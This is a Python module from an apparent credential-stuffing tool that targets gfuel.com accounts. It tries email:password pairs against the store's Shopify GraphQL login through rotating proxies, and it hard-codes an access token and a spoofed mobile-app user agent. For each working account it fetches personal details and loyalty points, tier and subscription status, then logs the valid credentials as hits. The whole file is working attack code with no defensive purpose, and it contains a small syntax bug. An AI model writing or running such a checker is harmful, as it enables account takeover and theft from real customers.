from __main__ import checker
from modules.functions import set_proxy, log, save
from requests import Session
from base64 import b64decode

def check(email:str,password:str):
    retries = 0
    while retries != checker.retries:
        proxy = set_proxy()
        header = {
            "Host": "gfuel.com" ,
            "accept": "application/json" ,
            "x-buy3-sdk-cache-key": "" ,
            "x-buy3-sdk-cache-fetch-strategy": "NETWORK_FIRST" ,
            "x-buy3-sdk-expire-timeout": "9223372036854775807" ,
            "user-agent": "Mobile Buy SDK Android/10.0.1/com.aeron.shopifycore.gfuel" ,
            "x-sdk-version": "10.0.1" ,
            "x-sdk-variant": "android" ,
            "x-shopify-storefront-access-token": "21765aa7568fd627c44d68bde191f6c0",
            "Content-Type":"application/graphql; charset=utf-8"
        }
        try:
            with Session() as s:
                r = s.post("https://gfuel.com/api/2021-07/graphql",data="mutation {customerAccessTokenCreate(input:{email:\""+email+"\",password:\""+password+"\"}){customerAccessToken{accessToken,expiresAt},userErrors{field,message}}}",headers=header,proxies=set_proxy(proxy),timeout=checker.timeout)
                if "customerAccessToken\":null" in r.text:
                    retries += 1
                elif "accessToken" in r.text:
                    token = r.json()["data"]["customerAccessTokenCreate"]["customerAccessToken"]["accessToken"]

                    r = s.post("https://gfuel.com/api/2021-07/graphql",data="query {customer(customerAccessToken:\""+token+"\"){createdAt,displayName,email,id,firstName,lastName,phone}}",headers=header,proxies=set_proxy(proxy),timeout=checker.timeout).json()
                    id = str(b64decode(r["data"]["customer"]["id"].encode()).decode()).split("gid://shopify/Customer/")[-1]

                    r = s.get(f"https://loyalty.yotpo.com/api/v1/customer_details?customer_email={email}&customer_external_id={id}&customer_token={token}&merchant_id=33869",proxies=set_proxy(proxy),timeout=checker.timeout)
                    if r.status_code == 403:
                        raise
                    else:
                        r = r.json()
                        xp = r.get("points_balance")
                        if xp == None or int(xp) <= 19:
                            if not checker.cui:
                                log("custom",email+":"+password,"Gfuel")
                            save("Gfuel","custom",checker.time,email+":"+password+f" | XP: {xp}")
                            checker.custom += 1
                            checker.cpm += 1
                            return
                        else:
                            tier = r.get("vip_tier").get("name")
                            subscribed = r.get("subscribed")
                            if not checker.cui:
                                log("good",email+":"+password,"Gfuel")
                            save("Gfuel","good",checker.time,email+":"+password+f" | Subscribed: {subscribed} | Tier: {tier} | XP: {xp}")
                            checker.good += 1
                            checker.cpm += 1
                            return
                else:
                    raise
        except:
            checker.errors += 1
    if not checker.cui:
        log("bad".email+":"+password,"Gfuel")
    checker.bad += 1
    checker.cpm += 1
    return